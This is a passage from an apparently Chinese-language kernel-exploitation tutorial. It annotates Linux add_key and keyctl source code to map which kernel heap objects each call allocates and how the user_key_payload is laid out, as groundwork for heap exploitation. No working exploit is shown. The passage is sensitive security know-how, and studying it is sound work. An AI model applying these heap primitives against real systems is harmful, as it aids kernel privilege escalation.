class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Extract the description of a new key from userspace and either add it as a</span><br><span class="hljs-comment"> * new key to the specified keyring or update a matching key in that keyring.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If the description is NULL or an empty string, the key type is asked to</span><br><span class="hljs-comment"> * generate one from the payload.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The keyring must be writable so that we can attach the key to it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, the new key&#x27;s serial number is returned, otherwise an error</span><br><span class="hljs-comment"> * code is returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">SYSCALL_DEFINE5</span>(add_key, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _type,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _description,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _payload,<br><span class="hljs-type">size_t</span>, plen,<br><span class="hljs-type">key_serial_t</span>, ringid)<br>&#123;<br><span class="hljs-type">key_ref_t</span> keyring_ref, key_ref;<br><span class="hljs-type">char</span> type[<span class="hljs-number">32</span>], *description;<br><span class="hljs-type">void</span> *payload;<br><span class="hljs-type">long</span> ret;<br><br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (plen &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">goto</span> error;<br><br><span class="hljs-comment">/* draw all the data into kernel space */</span><br>ret = <span class="hljs-built_in">key_get_type_from_user</span>(type, _type, <span class="hljs-built_in">sizeof</span>(type)); <span class="hljs-comment">//类型拷贝</span><br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> error;<br><br>description = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (_description) &#123;<br>description = <span class="hljs-built_in">strndup_user</span>(_description, KEY_MAX_DESC_SIZE);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR</span>(description)) &#123;<br>ret = <span class="hljs-built_in">PTR_ERR</span>(description);<br><span class="hljs-keyword">goto</span> error;<br>&#125;<br><span class="hljs-keyword">if</span> (!*description) &#123;<br><span class="hljs-built_in">kfree</span>(description);<br>description = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((description[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp;<br>   (<span class="hljs-built_in">strncmp</span>(type, <span class="hljs-string">&quot;keyring&quot;</span>, <span class="hljs-number">7</span>) == <span class="hljs-number">0</span>)) &#123;<br>ret = -EPERM;<br><span class="hljs-keyword">goto</span> error2;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* pull the payload in if one was supplied */</span><br>payload = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (plen) &#123;<br>ret = -ENOMEM;<br>payload = <span class="hljs-built_in">kvmalloc</span>(plen, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!payload)<br><span class="hljs-keyword">goto</span> error2;<br><br>ret = -EFAULT;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(payload, _payload, plen) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> error3;<br>&#125;<br><br><span class="hljs-comment">/* find the target keyring (which must be writable) */</span><br>keyring_ref = <span class="hljs-built_in">lookup_user_key</span>(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR</span>(keyring_ref)) &#123;<br>ret = <span class="hljs-built_in">PTR_ERR</span>(keyring_ref);<br><span class="hljs-keyword">goto</span> error3;<br>&#125;<br><br><span class="hljs-comment">/* create or update the requested key and add it to the target</span><br><span class="hljs-comment"> * keyring */</span><br>key_ref = <span class="hljs-built_in">key_create_or_update</span>(keyring_ref, type, description,<br>       payload, plen, KEY_PERM_UNDEF,<br>       KEY_ALLOC_IN_QUOTA);<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">IS_ERR</span>(key_ref)) &#123;<br>ret = <span class="hljs-built_in">key_ref_to_ptr</span>(key_ref)-&gt;serial;<br><span class="hljs-built_in">key_ref_put</span>(key_ref);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>ret = <span class="hljs-built_in">PTR_ERR</span>(key_ref);<br>&#125;<br><br><span class="hljs-built_in">key_ref_put</span>(keyring_ref);<br> error3:<br><span class="hljs-built_in">kvfree_sensitive</span>(payload, plen);<br> error2:<br><span class="hljs-built_in">kfree</span>(description);<br> error:<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面进行一个简短的分析，并记录我们所分配的object。</p><h4 id="object1、object2–存放临时的description和大小为plen的payload"><a href="#object1、object2–存放临时的description和大小为plen的payload" class="headerlink" title="object1、object2–存放临时的description和大小为plen的payload"></a>object1、object2–存放临时的description和大小为plen的payload</h4><ol><li>将传入的用户类型拷贝到内核的局部变量</li><li>调用<code>strndup_user</code>，其中参数<code>#define KEY_MAX_DESC_SIZE 4096</code> ,里面的一条调用链最终会归到<code>p = kmalloc_track_caller(len, GFP_USER | __GFP_NOWARN);</code>,也就是说会创建一个内核堆块来存放我们的<code>_description</code>，而其中<code>GFP_USER</code>等价于<code>GFP_KERNEL | __GFP_HARDWALL</code></li><li>然后先判断咱们是否有payload，若有，则通过kvmalloc函数来进行分配堆块，然后复制咱们的用户信息过去，这里的kvmalloc的功能实际上就是kmalloc和vmalloc的集合体，在分配一页以下的堆块时可看作使用kmalloc，否则使用vmalloc</li><li>以上两个堆块的申请在最后还是会释放，其中调用<code>kvfree_sensitive</code>和<code>kfree</code>来进行释放</li></ol><p>上面时单独这个系统调用的宏观分析，乍一看好像对我们的利用帮助并不大，但其实咱们还需要进一步分析，在调用上面的系统调用时，他会进入下面这个函数</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-comment">/* create or update the requested key and add it to the target</span><br><span class="hljs-comment"> * keyring */</span><br>key_ref = key_create_or_update(keyring_ref, type, description,<br><span class="hljs-built_in">       payload,</span> plen, KEY_PERM_UNDEF,<br>       KEY_ALLOC_IN_QUOTA)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>从注释也可以观察到，他可以创建和更新一个需求的密钥，并且加入咱们的钥匙扣，跟进会发现有如下调用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Create or potentially update a key. The combined logic behind</span><br><span class="hljs-comment"> * key_create_or_update() and key_create()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">key_ref_t</span> __key_create_or_update(<span class="hljs-type">key_ref_t</span> keyring_ref,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *type,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *description,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> *payload,<br><span class="hljs-type">size_t</span> plen,<br><span class="hljs-type">key_perm_t</span> perm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags,<br><span class="hljs-type">bool</span> allow_update)<br>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">keyring_index_key</span> index_key = &#123;<br>.description= description,<br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">key_preparsed_payload</span> prep;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">assoc_array_edit</span> *edit = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cred</span> *cred = <span class="hljs-built_in">current_cred</span>();<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> *keyring, *key = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">key_ref_t</span> key_ref;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">key_restriction</span> *restrict_link = <span class="hljs-literal">NULL</span>;<br>...<br><br><span class="hljs-comment">/* allocate a new key */</span><br>key = <span class="hljs-built_in">key_alloc</span>(index_key.type, index_key.description,<br>cred-&gt;fsuid, cred-&gt;fsgid, cred, perm, flags, <span class="hljs-literal">NULL</span>);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中会调用<code>key_alloc</code>这样一个函数、</p><h4 id="objecy3–分配struct-key"><a href="#objecy3–分配struct-key" class="headerlink" title="objecy3–分配struct key"></a>objecy3–分配struct key</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> *<span class="hljs-built_in">key_alloc</span>(<span class="hljs-keyword">struct</span> key_type *type, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *desc,<br>      <span class="hljs-type">kuid_t</span> uid, <span class="hljs-type">kgid_t</span> gid, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *cred,<br>      <span class="hljs-type">key_perm_t</span> perm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags,<br>      <span class="hljs-keyword">struct</span> key_restriction *restrict_link)<br>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">key_user</span> *user = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> *key;<br><span class="hljs-type">size_t</span> desclen, quotalen;<br><span class="hljs-type">int</span> ret;<br>...<br><br>desclen = <span class="hljs-built_in">strlen</span>(desc);<br>quotalen = desclen + <span class="hljs-number">1</span> + type-&gt;def_datalen;<br><br>...<br><br><span class="hljs-comment">/* allocate and initialise the key and its description */</span><br>key = <span class="hljs-built_in">kmem_cache_zalloc</span>(key_jar, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!key)<br><span class="hljs-keyword">goto</span> no_memory_2;<br><br>key-&gt;index_key.desc_len = desclen;<br>key-&gt;index_key.description = <span class="hljs-built_in">kmemdup</span>(desc, desclen + <span class="hljs-number">1</span>, GFP_KERNEL);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到他在一个<code>kmem_cache</code>类型的全局变量<code>key_jar</code>里面分配了堆块，且标志位应为<code>__GFP_ZERO|GFP_KERNEL</code>，他用来分配咱们的<code>key</code>值，也就是咱们的密钥结构体，并且香气中拷贝了长度以及描述，这个kmemdup函数的大致过程就是首先kmalloc一个堆块，然后调用memcpy拷贝我们的描述过去；</p><p>然后我们回到<code>__key_create_or_update</code>的分析，在调用key_alloc之前，他会首先再次分配一个堆块，我们进行其中部分代码的分析，如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl">...<br>memset(&amp;prep, <span class="hljs-number">0</span>, sizeof(prep));<br>prep.orig_description = description;<br>prep.<span class="hljs-keyword">data</span> = payload;<br>prep.datalen = plen;<br><span class="hljs-function"><span class="hljs-title">prep</span>.quotalen = index_key.type-&gt;</span>def_datalen;<br>prep.expiry = TIME64_MAX;<br><span class="hljs-function"><span class="hljs-title">if</span> (index_key.type-&gt;</span>preparse) &#123;<br><span class="hljs-function"><span class="hljs-title">ret</span> = index_key.type-&gt;</span>preparse(&amp;prep);<br>...<br></code></pre></td></tr></table></figure><p>这里会调用到<code>index_key.type-&gt;preparse()</code>函数，其中该type如何判断是什么呢，我们可以找到该type的赋值判断过程，然后发现是由于我们最开始add_key的系统调用里面传入一个字符串，然后通过一个函数来根据该传入的字符串从一个内核全局列表里面遍历查找是否有类似的type，因此我就把寻找目标定在初始化函数里面，这个列表名我们知道，因此可以简单的通过一些源码查看工具找到初始化函数，然后就可以看到其中的一些类别，如下：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Initialise the key management state.</span><br><span class="hljs-comment"> */</span><br>void __init key_init(void)<br>&#123;<br><span class="hljs-comment">/* allocate a slab in which we can store keys */</span><br>key_jar = kmem_cache_create(<span class="hljs-string">&quot;key_jar&quot;</span>, sizeof(struct <span class="hljs-keyword">key</span>),<br>0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-keyword">NULL</span>);<br><br><span class="hljs-comment">/* add the special key types */</span><br>list_add_tail(<span class="hljs-variable">&amp;key_type_keyring.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br>list_add_tail(<span class="hljs-variable">&amp;key_type_dead.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br>list_add_tail(<span class="hljs-variable">&amp;key_type_user.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br>list_add_tail(<span class="hljs-variable">&amp;key_type_logon.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br><br><span class="hljs-comment">/* record the root user tracking */</span><br>rb_link_node(<span class="hljs-variable">&amp;root_key_user.</span>node,<br>     <span class="hljs-keyword">NULL</span>,<br>     <span class="hljs-variable">&amp;key_user_tree.</span>rb_node);<br><br>rb_insert_color(<span class="hljs-variable">&amp;root_key_user.</span>node,<br><span class="hljs-variable">&amp;key_user_tree</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到该list里面有上面四种情况，而由于我们仅仅关注user方面的，所以仅看其中一种即可，user type的key如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">/*<br> * user defined keys take an arbitrary string as the description and an<br> * arbitrary blob of data as the payload<br> */<br>struct key_type key_type_user = &#123;<br><span class="hljs-string">.name</span>= <span class="hljs-string">&quot;user&quot;</span>,<br><span class="hljs-string">.preparse</span>= user_preparse,<br><span class="hljs-string">.free_preparse</span>= user_free_preparse,<br><span class="hljs-string">.instantiate</span>= generic_key_instantiate,<br><span class="hljs-string">.update</span>= user_update,<br><span class="hljs-string">.revoke</span>= user_revoke,<br><span class="hljs-string">.destroy</span>= user_destroy,<br><span class="hljs-string">.describe</span>= user_describe,<br><span class="hljs-string">.read</span>= user_read,<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>我们回到刚刚的<code>__key_create_or_update</code>，里面调用了我们user的函数<code>.preparse</code>,他指向我们的<code>user_preparse</code>函数，我们可以往下继续看</p><h4 id="object4–分配user-key-payload"><a href="#object4–分配user-key-payload" class="headerlink" title="object4–分配user_key_payload"></a>object4–分配user_key_payload</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Preparse a user defined key payload</span><br><span class="hljs-comment"> */</span><br>int user_preparse(struct key_preparsed_payload *prep)<br>&#123;<br>struct user_key_payload *upayload;<br><span class="hljs-function"><span class="hljs-title">size_t</span> datalen = prep-&gt;</span>datalen;<br><br><span class="hljs-function"><span class="hljs-title">if</span> (datalen &lt;= 0 || datalen &gt; 32767 || !prep-&gt;</span><span class="hljs-keyword">data</span>)<br>return -EINVAL;<br><br>upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!upayload)<br>return -ENOMEM;<br><br><span class="hljs-comment">/* attach the data */</span><br><span class="hljs-function"><span class="hljs-title">prep</span>-&gt;</span>quotalen = datalen;<br><span class="hljs-function"><span class="hljs-title">prep</span>-&gt;</span>payload.<span class="hljs-keyword">data</span>[<span class="hljs-number">0</span>] = upayload;<br><span class="hljs-function"><span class="hljs-title">upayload</span>-&gt;</span>datalen = datalen;<br><span class="hljs-function"><span class="hljs-title">memcpy</span>(upayload-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>, prep-&gt;</span><span class="hljs-keyword">data</span>, datalen);<br>return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数并不是很长，大致含义会再次分配一个<code>user_key_payload</code>的结构体加上我们之前传入的plen大小的堆块，这个<code>user_key_payload</code>即是作为一个保护头而存在，其中该结构体如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">/*</span><br><span class="hljs-bullet"> *</span> the payload for a key of type &quot;user&quot; or &quot;logon&quot;<br><span class="hljs-bullet"> *</span> - once filled in and attached to a key:<br><span class="hljs-bullet"> *</span>   - the payload struct is invariant may not be changed, only replaced<br><span class="hljs-bullet"> *</span>   - the payload must be read with RCU procedures or with the key semaphore<br><span class="hljs-bullet"> *</span>     held<br><span class="hljs-bullet"> *</span>   - the payload may only be replaced with the key semaphore write-locked<br><span class="hljs-bullet"> *</span> - the key&#x27;s data length is the size of the actual data, not including the<br><span class="hljs-bullet"> *</span>   payload wrapper<br> <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">struct user_key_payload &#123;</span><br><span class="hljs-emphasis">struct rcu_headrcu;/*</span> RCU destructor <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">unsigned shortdatalen;/*</span> length of this data <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">chardata[] <span class="hljs-strong">__aligned(__</span>alignof<span class="hljs-strong">__(u64)); /* actual data */</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">&#125;;</span></span><br></code></pre></td></tr></table></figure><p>而其中的<code>rcu_head</code>字段如下：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_head callback_head</span><br><span class="hljs-keyword">struct</span> <span class="hljs-type">callback_head</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-type">callback_head</span> *next;<br><span class="hljs-built_in">void</span> (*func)(<span class="hljs-keyword">struct</span> <span class="hljs-type">callback_head</span> *);<br>&#125;;<br></code></pre></td></tr></table></figure><p>也就是说最后object4会保存一段的user_key_payload头和我们的payload数据。其中头部到达数据的距离为0x18字节，这是因为存在对齐关键字。</p><p>综上所述，<code>add_key</code>系统调用过程有以下几个步骤：</p><ol><li>判断description是否为空来分配相应大小的临时堆块object1</li><li>根据plen来分配传入payload的临时堆块object2</li><li>分配我们的user_key_payload堆块object3，其中包含的内容一部分是0x18大小的头部以及剩下的我们自行传入的payload</li><li>分配struct key堆块object4，注意这里是使用独立的kmem_cache key_jar来分配,返回keyid</li><li>释放临时堆块object1、object2</li></ol><h3 id="3-keyctl基础知识"><a href="#3-keyctl基础知识" class="headerlink" title="3.keyctl基础知识"></a>3.keyctl基础知识</h3><p>我们了解到了如何通过系统调用来获得key，那么现在我们如何利用它呢，这里就得介绍一下我们的keyctl系统调用，手册在解释add_key系统调用的时候就已经列出</p><p>其大致功能就是对于我们add_key所获得的key_id来操纵该key，系统调用如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The key control system call</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE5(keyctl, <span class="hljs-type">int</span>, option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg3,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg5)<br>&#123;<br><span class="hljs-keyword">switch</span> (option) &#123;<br>...<br><br><span class="hljs-keyword">case</span> KEYCTL_UPDATE:<br><span class="hljs-keyword">return</span> keyctl_update_key((<span class="hljs-type">key_serial_t</span>) arg2,<br> (<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *) arg3,<br> (<span class="hljs-type">size_t</span>) arg4);<br><br><span class="hljs-keyword">case</span> KEYCTL_REVOKE:<br><span class="hljs-keyword">return</span> keyctl_revoke_key((<span class="hljs-type">key_serial_t</span>) arg2);<br><br>...<br><br><span class="hljs-keyword">case</span> KEYCTL_READ:<br><span class="hljs-keyword">return</span> keyctl_read_key((<span class="hljs-type">key_serial_t</span>) arg2,<br>       (<span class="hljs-type">char</span> __user *) arg3,<br>       (<span class="hljs-type">size_t</span>) arg4);<br><br>    <span class="hljs-keyword">case</span> KEYCTL_UNLINK:<br><span class="hljs-keyword">return</span> keyctl_keyring_unlink((<span class="hljs-type">key_serial_t</span>) arg2,<br>     (<span class="hljs-type">key_serial_t</span>) arg3);<br><br>...<br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="one-KEYCTL-UPDATE"><a href="#one-KEYCTL-UPDATE" class="headerlink" title=":one:KEYCTL_UPDATE"></a>:one:KEYCTL_UPDATE</h4><p>首先该选项会调用key_update_key函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Update a key&#x27;s data payload from the given data.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The key must grant the caller Write permission and the key type must support</span><br><span class="hljs-comment"> * updating for this to work.  A negative key can be positively instantiated</span><br><span class="hljs-comment"> * with this call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, 0 will be returned.  If the key type does not support</span><br><span class="hljs-comment"> * updating, then -EOPNOTSUPP will be returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_update_key</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> id,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *_payload,</span><br><span class="hljs-params">       <span class="hljs-type">size_t</span> plen)</span><br>&#123;<br><span class="hljs-type">key_ref_t</span> key_ref;<br><span class="hljs-type">void</span> *payload;<br><span class="hljs-type">long</span> ret;<br><br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (plen &gt; PAGE_SIZE)<br><span class="hljs-keyword">goto</span> error;<br><br><span class="hljs-comment">/* pull the payload in if one was supplied */</span><br>payload = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (plen) &#123;<br>ret = -ENOMEM;<br>payload = kvmalloc(plen, GFP_KERNEL); <span class="hljs-comment">//分配临时payload</span><br><span class="hljs-keyword">if</span> (!payload)<br><span class="hljs-keyword">goto</span> error;<br><br>ret = -EFAULT;<br><span class="hljs-keyword">if</span> (copy_from_user(payload, _payload, plen) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> error2;<br>&#125;<br><br>...<br><br><span class="hljs-comment">/* update the key */</span><br>ret = key_update(key_ref, payload, plen);<br><br>...<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数首先分配一个临时堆块来存放payload，然后传入key_update核心处理函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 